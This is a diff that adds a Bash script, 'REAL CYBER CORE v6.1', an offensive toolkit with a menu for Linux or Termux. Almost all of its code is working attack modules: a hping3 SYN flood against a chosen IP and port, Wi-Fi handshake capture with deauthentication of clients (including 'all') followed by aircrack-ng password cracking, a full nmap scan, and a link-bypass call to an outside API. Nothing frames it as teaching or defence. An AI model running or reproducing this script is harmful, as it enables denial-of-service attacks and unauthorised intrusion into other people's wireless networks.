@@ -1,0 +1,167 @@
+#!/bin/bash
+
+# REAL CYBER CORE v6.1 (Auto-Install Edition)
+# Run as root / Termux.
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+# ฟังก์ชันตรวจสอบและติดตั้งเครื่องมืออัตโนมัติ
+auto_install_tools() {
+    clear
+    echo -e "${YELLOW}[*] Checking and installing missing tools automatically...${NC}"
+    
+    # รายชื่อเครื่องมือที่จำเป็นต้องใช้
+    local tools=("curl" "jq" "nmap" "hping3")
+    
+    for tool in "${tools[@]}"; do
+        if ! command -v "$tool" >/dev/null 2>&1; then
+            echo -e "${YELLOW}[!] Missing tool: $tool. Installing...${NC}"
+            if command -v pkg >/dev/null 2>&1; then
+                pkg update -y && pkg install -y "$tool"
+            elif command -v apt-get >/dev/null 2>&1; then
+                sudo apt-get update && sudo apt-get install -y "$tool"
+            else
+                echo -e "${RED}[X] Could not install $tool automatically. Please install it manually.${NC}"
+            fi
+        else
+            echo -e "${GREEN}[OK] $tool is ready.${NC}"
+        fi
+    done
+    sleep 1
+}
+
+check_root() {
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}Root required for this module.${NC}"
+        sleep 1
+    fi
+}
+
+bypass_module() {
+    echo -ne "${WHITE}TARGET URL > ${NC}"
+    read -r url
+    [[ ! "$url" =~ ^https?:// ]] && url="https://$url"
+    echo -e "${YELLOW}[*] Querying bypass API...${NC}"
+    raw=$(curl -s --connect-timeout 10 "https://api.bypass.vip/bypass?url=$url")
+    final=$(echo "$raw" | jq -r '.destination // .result // .url' 2>/dev/null)
+    if [[ -n "$final" && "$final" =~ ^https?:// ]]; then
+        echo -e "${GREEN}RESULT: $final${NC}"
+        if command -v termux-clipboard-set >/dev/null 2>&1; then
+            termux-clipboard-set "$final"
+            echo -e "${YELLOW}Copied to clipboard.${NC}"
+        fi
+    else
+        echo -e "${RED}Bypass failed.${NC}"
+        echo "$raw"
+    fi
+}
+
+wifi_module() {
+    check_root
+    echo -ne "${WHITE}Wireless interface [wlan0]: ${NC}"
+    read -r iface
+    iface=${iface:-wlan0}
+
+    echo -e "${YELLOW}[*] Starting monitor mode on $iface...${NC}"
+    airmon-ng start "$iface"
+
+    mon=$(iwconfig 2>/dev/null | grep -o '^[^ ]*mon' | head -n1)
+    [[ -z "$mon" ]] && mon="${iface}mon"
+    echo -e "${GREEN}Monitor interface: $mon${NC}"
+
+    echo -e "${YELLOW}[*] Scanning networks for 15 seconds...${NC}"
+    timeout 15 airodump-ng "$mon" > /tmp/airodump_scan.txt 2>&1
+    grep -E '([0-9A-F]{2}:){5}[0-9A-F]{2}' /tmp/airodump_scan.txt | head -n 20
+
+    echo -ne "${WHITE}BSSID: ${NC}"
+    read -r bssid
+    echo -ne "${WHITE}Channel: ${NC}"
+    read -r ch
+    echo -ne "${WHITE}Output prefix [capture]: ${NC}"
+    read -r out
+    out=${out:-capture}
+
+    echo -e "${YELLOW}[*] Capturing handshake on $bssid channel $ch...${NC}"
+    airodump-ng -c "$ch" --bssid "$bssid" -w "$out" "$mon" &
+    airodump_pid=$!
+    sleep 5
+
+    echo -ne "${WHITE}Client MAC to deauth (or 'all'): ${NC}"
+    read -r client
+    if [[ "$client" == "all" ]]; then
+        aireplay-ng --deauth 10 -a "$bssid" "$mon"
+    else
+        aireplay-ng --deauth 10 -a "$bssid" -c "$client" "$mon"
+    fi
+
+    sleep 10
+    kill "$airodump_pid" 2>/dev/null
+    wait "$airodump_pid" 2>/dev/null
+
+    cap="${out}-01.cap"
+    if [[ -f "$cap" ]]; then
+        echo -ne "${WHITE}Wordlist path: ${NC}"
+        read -r wl
+        aircrack-ng "$cap" -w "$wl"
+    else
+        echo -e "${RED}Capture file not found.${NC}"
+    fi
+}
+
+dos_module() {
+    check_root
+    echo -ne "${WHITE}Target IP: ${NC}"
+    read -r ip
+    echo -ne "${WHITE}Target port [80]: ${NC}"
+    read -r port
+    port=${port:-80}
+    echo -e "${RED}[*] SYN flood to $ip:$port. Ctrl+C to stop.${NC}"
+    hping3 -S --flood -V -p "$port" "$ip"
+}
+
+scan_module() {
+    echo -ne "${WHITE}Target IP/domain: ${NC}"
+    read -r target
+    echo -e "${YELLOW}[*] Full TCP scan and version detection...${NC}"
+    nmap -sV -sC -p- -T4 "$target"
+}
+
+# รันฟังก์ชันตรวจสอบและติดตั้งเครื่องมืออัตโนมัติก่อนเริ่มโปรแกรม
+auto_install_tools
+
+while true; do
+    clear
+    echo -e "${GREEN}"
+    echo "  ██████╗██╗   ██╗██████╗ ███████╗██████╗ "
+    echo " ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗"
+    echo " ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝"
+    echo " ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗"
+    echo " ╚██████╗   ██║   ██████╔╝███████╗██║  ██║"
+    echo "  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝"
+    echo -e "         -- REAL OPERATOR CONSOLE v6.1 --${NC}"
+    echo -e "${GREEN}-------------------------------------------------------${NC}"
+    echo -e " ${WHITE}[1] Link Bypass${NC}"
+    echo -e " ${WHITE}[2] Wi-Fi Handshake Capture + Crack${NC}"
+    echo -e " ${WHITE}[3] SYN Flood (hping3)${NC}"
+    echo -e " ${WHITE}[4] Port & Service Scan (nmap)${NC}"
+    echo -e " ${WHITE}[0] Exit${NC}"
+    echo -e "${GREEN}-------------------------------------------------------${NC}"
+    echo -ne "${GREEN}CYBER-CORE>${NC} "
+    read -r choice
+
+    case "$choice" in
+        1) bypass_module ;;
+        2) wifi_module ;;
+        3) dos_module ;;
+        4) scan_module ;;
+        0) exit 0 ;;
+        *) echo -e "${RED}Invalid.${NC}"; sleep 1 ;;
+    esac
+    echo -ne "${WHITE}Press Enter to continue...${NC}"
+    read -r
+done
